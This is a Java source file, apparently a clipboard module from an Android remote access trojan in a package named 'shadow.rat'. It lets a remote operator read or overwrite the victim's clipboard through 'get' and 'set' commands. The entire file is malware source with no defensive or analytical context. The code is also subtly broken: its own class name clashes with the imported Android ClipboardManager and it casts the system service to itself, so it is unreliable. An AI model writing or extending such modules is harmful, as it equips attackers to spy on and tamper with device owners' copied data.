package com.shadow.rat.modules;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;

public class ClipboardManager implements Module {

    private final Context context;

    public ClipboardManager(Context context) {
        this.context = context;
    }

    @Override
    public String execute(String command) {
        if (command.equalsIgnoreCase("get")) {
            return getClipboard();
        } else if (command.startsWith("set")) {
            return setClipboard(command.substring(4));
        }
        return "Unknown command for ClipboardManager. Available commands: get, set <text>";
    }

    private String getClipboard() {
        ClipboardManager clipboard = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
        if (clipboard.hasPrimaryClip()) {
            ClipData clipData = clipboard.getPrimaryClip();
            if (clipData.getItemCount() > 0) {
                return clipData.getItemAt(0).getText().toString();
            }
        }
        return "Clipboard is empty.";
    }

    private String setClipboard(String text) {
        ClipboardManager clipboard = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
        ClipData clip = ClipData.newPlainText("label", text);
        clipboard.setPrimaryClip(clip);
        return "Clipboard text set.";
    }
}
